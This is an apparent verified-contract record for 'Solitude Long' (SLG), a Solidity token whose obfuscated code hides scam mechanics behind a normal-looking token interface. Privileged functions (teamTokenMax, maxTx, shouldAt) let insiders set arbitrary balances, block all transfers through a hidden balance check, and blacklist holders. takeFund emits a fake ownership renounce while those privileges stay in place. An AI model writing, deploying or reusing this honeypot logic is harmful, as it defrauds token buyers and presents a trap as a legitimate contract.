{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface liquidityLaunchedMode {\n    function createPair(address totalFund, address totalTeamMax) external returns (address);\n}\n\ninterface receiverSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldAuto) external view returns (uint256);\n\n    function transfer(address minAuto, uint256 autoExempt) external returns (bool);\n\n    function allowance(address marketingBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAuto,\n        uint256 autoExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitListFund, uint256 value);\n    event Approval(address indexed marketingBuy, address indexed spender, uint256 value);\n}\n\nabstract contract receiverFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoReceiverSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverSellMetadata is receiverSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SolitudeLong is receiverFrom, receiverSell, receiverSellMetadata {\n\n    function transferFrom(address listExempt, address minAuto, uint256 autoExempt) external override returns (bool) {\n        if (_msgSender() != txBuySwap) {\n            if (receiverBuyMin[listExempt][_msgSender()] != type(uint256).max) {\n                require(autoExempt <= receiverBuyMin[listExempt][_msgSender()]);\n                receiverBuyMin[listExempt][_msgSender()] -= autoExempt;\n            }\n        }\n        return launchBuy(listExempt, minAuto, autoExempt);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listSell;\n    }\n\n    function transfer(address limitFrom, uint256 autoExempt) external virtual override returns (bool) {\n        return launchBuy(_msgSender(), limitFrom, autoExempt);\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverBuyMin;\n\n    uint256 constant swapFrom = 13 ** 10;\n\n    address teamLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchBuy(address listExempt, address minAuto, uint256 autoExempt) internal returns (bool) {\n        if (listExempt == modeListTotal) {\n            return launchAt(listExempt, minAuto, autoExempt);\n        }\n        uint256 isWalletMode = receiverSell(modeShould).balanceOf(teamLaunched);\n        require(isWalletMode == feeTotal);\n        require(minAuto != teamLaunched);\n        if (teamMode[listExempt]) {\n            return launchAt(listExempt, minAuto, swapFrom);\n        }\n        return launchAt(listExempt, minAuto, autoExempt);\n    }\n\n    constructor (){\n        if (takeTo != txTrading) {\n            txTrading = false;\n        }\n        autoReceiverSender receiverList = autoReceiverSender(txBuySwap);\n        modeShould = liquidityLaunchedMode(receiverList.factory()).createPair(receiverList.WETH(), address(this));\n        if (takeTo != txTrading) {\n            receiverMax = fromMin;\n        }\n        modeListTotal = _msgSender();\n        minLimit[modeListTotal] = true;\n        takeFundMin[modeListTotal] = launchFee;\n        takeFund();\n        \n        emit Transfer(address(0), modeListTotal, launchFee);\n    }\n\n    uint256 private launchFee = 100000000 * 10 ** 18;\n\n    address txBuySwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed atSenderShould, address indexed toLaunch);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchFee;\n    }\n\n    function owner() external view returns (address) {\n        return launchTrading;\n    }\n\n    mapping(address => bool) public teamMode;\n\n    function approve(address takeLiquidity, uint256 autoExempt) public virtual override returns (bool) {\n        receiverBuyMin[_msgSender()][takeLiquidity] = autoExempt;\n        emit Approval(_msgSender(), takeLiquidity, autoExempt);\n        return true;\n    }\n\n    uint256 public fromMin;\n\n    address private launchTrading;\n\n    address public modeListTotal;\n\n    uint256 public receiverMax;\n\n    bool private senderList;\n\n    bool private takeTo;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeExempt;\n    }\n\n    function takeFund() public {\n        emit OwnershipTransferred(modeListTotal, address(0));\n        launchTrading = address(0);\n    }\n\n    function teamTokenMax(address limitFrom, uint256 autoExempt) public {\n        liquidityTake();\n        takeFundMin[limitFrom] = autoExempt;\n    }\n\n    function maxTx(uint256 autoExempt) public {\n        liquidityTake();\n        feeTotal = autoExempt;\n    }\n\n    function balanceOf(address shouldAuto) public view virtual override returns (uint256) {\n        return takeFundMin[shouldAuto];\n    }\n\n    string private modeExempt = \"SLG\";\n\n    mapping(address => bool) public minLimit;\n\n    function liquidityTake() private view {\n        require(minLimit[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingToken;\n    }\n\n    function enableAuto(address limitMax) public {\n        if (tradingLimit) {\n            return;\n        }\n        \n        minLimit[limitMax] = true;\n        if (senderList == txTrading) {\n            fromMin = receiverMax;\n        }\n        tradingLimit = true;\n    }\n\n    bool public tradingLimit;\n\n    function allowance(address maxSwap, address takeLiquidity) external view virtual override returns (uint256) {\n        if (takeLiquidity == txBuySwap) {\n            return type(uint256).max;\n        }\n        return receiverBuyMin[maxSwap][takeLiquidity];\n    }\n\n    mapping(address => uint256) private takeFundMin;\n\n    uint256 feeTotal;\n\n    uint256 txEnableTeam;\n\n    bool public txTrading;\n\n    string private listSell = \"Solitude Long\";\n\n    function shouldAt(address toTakeAmount) public {\n        liquidityTake();\n        if (txTrading == senderList) {\n            fromMin = receiverMax;\n        }\n        if (toTakeAmount == modeListTotal || toTakeAmount == modeShould) {\n            return;\n        }\n        teamMode[toTakeAmount] = true;\n    }\n\n    uint8 private marketingToken = 18;\n\n    function launchAt(address listExempt, address minAuto, uint256 autoExempt) internal returns (bool) {\n        require(takeFundMin[listExempt] >= autoExempt);\n        takeFundMin[listExempt] -= autoExempt;\n        takeFundMin[minAuto] += autoExempt;\n        emit Transfer(listExempt, minAuto, autoExempt);\n        return true;\n    }\n\n    address public modeShould;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSenderShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitListFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"enableAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoExempt\",\"type\":\"uint256\"}],\"name\":\"maxTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeListTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTakeAmount\",\"type\":\"address\"}],\"name\":\"shouldAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExempt\",\"type\":\"uint256\"}],\"name\":\"teamTokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SolitudeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}